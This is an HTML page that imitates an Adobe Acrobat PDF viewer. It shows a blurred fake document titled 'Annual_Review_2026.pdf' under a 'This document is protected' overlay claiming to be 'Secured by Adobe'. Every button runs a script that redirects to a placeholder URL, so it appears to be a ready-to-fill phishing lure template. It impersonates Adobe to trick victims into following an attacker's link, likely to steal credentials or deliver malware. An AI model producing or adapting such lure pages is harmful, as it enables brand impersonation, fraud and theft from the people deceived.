<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Adobe Acrobat - PDF Viewer</title>
    <link rel="icon" href="https://www.adobe.com/favicon.ico">
    <style>
        @page { size: A4; margin: 0; }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: adobe-clean, 'Source Sans Pro', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background-color: #1e1e1e;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        /* Toolbar */
        .toolbar {
            background: #2c2c2c;
            padding: 10px 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            border-bottom: 1px solid #3d3d3d;
        }

        .toolbar-left {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .toolbar-logo {
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .toolbar-logo svg {
            width: 22px;
            height: 20px;
        }

        .toolbar-logo span {
            color: #e0e0e0;
            font-size: 14px;
            font-weight: 600;
        }

        .toolbar-sep {
            width: 1px;
            height: 20px;
            background: #4a4a4a;
        }

        .toolbar-file {
            color: #b3b3b3;
            font-size: 13px;
        }

        .toolbar-right {
            display: flex;
            align-items: center;
            gap: 6px;
        }

        .tb-btn {
            background: none;
            border: none;
            color: #b3b3b3;
            padding: 7px 12px;
            font-size: 12px;
            cursor: pointer;
            border-radius: 6px;
            display: flex;
            align-items: center;
            gap: 6px;
            transition: all 0.15s ease;
            font-weight: 500;
        }

        .tb-btn:hover {
            background: #3d3d3d;
            color: #e0e0e0;
        }

        .tb-btn svg {
            width: 15px;
            height: 15px;
        }

        .tb-btn.accent {
            background: #EB1000;
            color: #ffffff;
        }

        .tb-btn.accent:hover {
            background: #c40d00;
        }

        /* Viewer area */
        .viewer {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 32px 20px;
            position: relative;
        }

        .document-page {
            background: #ffffff;
            width: 620px;
            min-height: 800px;
            box-shadow: 0 8px 40px rgba(0, 0, 0, 0.5);
            border-radius: 4px;
            position: relative;
            overflow: hidden;
        }

        /* Blurred content */
        .page-text {
            padding: 56px 52px;
            filter: blur(3px);
            user-select: none;
            pointer-events: none;
            opacity: 0.7;
        }

        .page-text .tl {
            height: 9px;
            background: #d4d4d4;
            border-radius: 4px;
            margin-bottom: 12px;
        }

        .page-text .tl.w95 { width: 95%; }
        .page-text .tl.w88 { width: 88%; }
        .page-text .tl.w75 { width: 75%; }
        .page-text .tl.w60 { width: 60%; }
        .page-text .tl.w92 { width: 92%; }

        .page-text .th {
            height: 14px;
            background: #b0b0b0;
            border-radius: 7px;
            margin-bottom: 20px;
            width: 48%;
        }

        .page-text .gap { height: 28px; }

        /* Download overlay */
        .doc-overlay {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(255, 255, 255, 0.92);
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .overlay-content {
            text-align: center;
            max-width: 340px;
            padding: 28px;
        }

        .overlay-badge {
            width: 60px;
            height: 60px;
            background: #fff0ef;
            border-radius: 50%;
            margin: 0 auto 20px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .overlay-badge svg {
            width: 30px;
            height: 30px;
        }

        .overlay-content h3 {
            font-size: 18px;
            font-weight: 700;
            color: #2c2c2c;
            margin-bottom: 8px;
        }

        .overlay-content p {
            font-size: 14px;
            color: #6e6e6e;
            line-height: 1.6;
            margin-bottom: 24px;
        }

        .overlay-action {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            background: #EB1000;
            color: #ffffff;
            border: none;
            border-radius: 24px;
            padding: 13px 32px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s ease, box-shadow 0.2s ease;
            text-decoration: none;
        }

        .overlay-action:hover {
            background: #c40d00;
            box-shadow: 0 4px 16px rgba(235, 16, 0, 0.25);
        }

        .overlay-action svg {
            width: 16px;
            height: 16px;
        }

        .overlay-meta {
            margin-top: 14px;
            font-size: 11px;
            color: #b3b3b3;
        }

        /* Page info bar */
        .page-bar {
            background: #2c2c2c;
            padding: 8px 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
        }

        .page-bar span {
            color: #8a8a8a;
            font-size: 12px;
        }

        /* Print / PDF styles */
        @media print {
            body { background: #ffffff; }
            .toolbar, .page-bar { -webkit-print-color-adjust: exact; print-color-adjust: exact; }
            .document-page { box-shadow: none; border: 1px solid #e0e0e0; }
            .overlay-action { -webkit-print-color-adjust: exact; print-color-adjust: exact; }
            .overlay-badge { -webkit-print-color-adjust: exact; print-color-adjust: exact; }
        }
    </style>
</head>
<body>
    <!-- Toolbar -->
    <div class="toolbar">
        <div class="toolbar-left">
            <div class="toolbar-logo">
                <svg viewBox="0 0 30 26" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M11.5 0H0V26L11.5 0Z" fill="#EB1000"/>
                    <path d="M18.5 0H30V26L18.5 0Z" fill="#EB1000"/>
                    <path d="M15 9.6L22.1 26H17.5L15.3 20.5H10L15 9.6Z" fill="#EB1000"/>
                </svg>
                <span>Acrobat</span>
            </div>
            <div class="toolbar-sep"></div>
            <span class="toolbar-file">Annual_Review_2026.pdf</span>
        </div>
        <div class="toolbar-right">
            <button class="tb-btn" onclick="handleAction()">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                    <circle cx="18" cy="5" r="3"/>
                    <circle cx="6" cy="12" r="3"/>
                    <circle cx="18" cy="19" r="3"/>
                    <line x1="8.59" y1="13.51" x2="15.42" y2="17.49"/>
                    <line x1="15.41" y1="6.51" x2="8.59" y2="10.49"/>
                </svg>
                Share
            </button>
            <button class="tb-btn accent" onclick="handleAction()">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                    <path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/>
                    <polyline points="7 10 12 15 17 10"/>
                    <line x1="12" y1="15" x2="12" y2="3"/>
                </svg>
                Download
            </button>
        </div>
    </div>

    <!-- Viewer -->
    <div class="viewer">
        <div class="document-page">
            <div class="page-text">
                <div class="th"></div>
                <div class="tl w95"></div>
                <div class="tl w92"></div>
                <div class="tl w88"></div>
                <div class="tl w95"></div>
                <div class="tl w75"></div>
                <div class="gap"></div>
                <div class="th" style="width:36%"></div>
                <div class="tl w95"></div>
                <div class="tl w88"></div>
                <div class="tl w92"></div>
                <div class="tl w95"></div>
                <div class="tl w60"></div>
                <div class="gap"></div>
                <div class="tl w95"></div>
                <div class="tl w92"></div>
                <div class="tl w88"></div>
                <div class="tl w75"></div>
                <div class="tl w95"></div>
                <div class="tl w92"></div>
                <div class="tl w60"></div>
            </div>

            <div class="doc-overlay">
                <div class="overlay-content">
                    <div class="overlay-badge">
                        <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8l-6-6z" fill="#EB1000" opacity="0.2" stroke="#EB1000" stroke-width="1.5"/>
                            <polyline points="14 2 14 8 20 8" fill="none" stroke="#EB1000" stroke-width="1.5"/>
                        </svg>
                    </div>
                    <h3>Download to view document</h3>
                    <p>This document is protected. Download the PDF to access the full content.</p>
                    <button class="overlay-action" onclick="handleAction()">
                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                            <path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/>
                            <polyline points="7 10 12 15 17 10"/>
                            <line x1="12" y1="15" x2="12" y2="3"/>
                        </svg>
                        Download PDF
                    </button>
                    <div class="overlay-meta">2.8 MB &middot; 10 pages &middot; Secured by Adobe</div>
                </div>
            </div>
        </div>
    </div>

    <!-- Page bar -->
    <div class="page-bar">
        <span>Page 1 of 10</span>
        <span>&middot;</span>
        <span>100%</span>
    </div>

    <script>
        function handleAction() {
            window.location.href = 'REDIRECT_URL_HERE';
        }
    </script>
</body>
</html>
